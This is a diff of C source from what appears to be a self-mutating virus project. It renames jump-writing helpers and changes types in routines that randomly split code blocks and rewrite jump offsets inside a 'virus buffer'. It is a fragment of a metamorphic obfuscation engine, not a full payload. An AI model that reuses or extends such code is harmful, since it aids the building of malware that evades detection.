@@ -53,7 +53,7 @@ static size_t	size_split_at_jump(const struct safe_ptr *ref_origin,
 	for (size_t j = 0; j < njumps; j++)
 	{
 		// skip non absolute long jmp insts
-		if (!is_jump32(*(uint8_t*)(jumps[j].location)))
+		if (!is_jmp32(*(uint8_t*)(jumps[j].location)))
 			continue;
 
 		if (mid_start < jumps[j].location && jumps[j].location < mid_end)
@@ -158,12 +158,12 @@ static bool	split_block(struct code_block *origin, struct code_block *half,
 **	1     1     1     1
 **	[0][4][2][5][1][6][3][7]
 */
-static bool	recursive_split_blocks(struct code_block *blocks, size_t split,
+static bool	recursive_split_blocks(struct code_block *blocks, int split,
 			uint64_t *seed)
 {
 	if (split == 0) return true;
 
-	size_t	half = POW2(split) / 2;
+	int	half = POW2(split) / 2;
 
 	if (!split_block(&blocks[0], &blocks[half], seed))
 		return errors(ERR_THROW, _ERR_T_RECURSIVE_SPLIT_BLOCKS);
@@ -328,7 +328,7 @@ static bool	adjust_jumps(struct safe_ptr virus_buffer_ref,
 		const size_t	jump_offset = jump_value_addr - block_start;
 		const size_t	dst_offset = block_offset + jump_offset;
 
-		if (!write_jump32_value(virus_buffer_ref, dst_offset, jump_value))
+		if (!write_i32_value(virus_buffer_ref, dst_offset, jump_value))
 			return errors(ERR_THROW, _ERR_T_ADJUST_JUMPS);
 	}
 	return true;
@@ -373,7 +373,7 @@ static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref,
 	if (tj_end + rel_jump != tb_start)
 		return errors(ERR_VIRUS, _ERR_V_BAD_TRAILING_JUMP);
 
-	if (!write_jump32(virus_buffer_ref, tj_offset, rel_jump))
+	if (!write_jmp32(virus_buffer_ref, tj_offset, rel_jump))
 		return errors(ERR_THROW, _ERR_T_ADD_TRAILING_JUMP);
 
 	*virus_buffer_size += JUMP32_INST_SIZE;
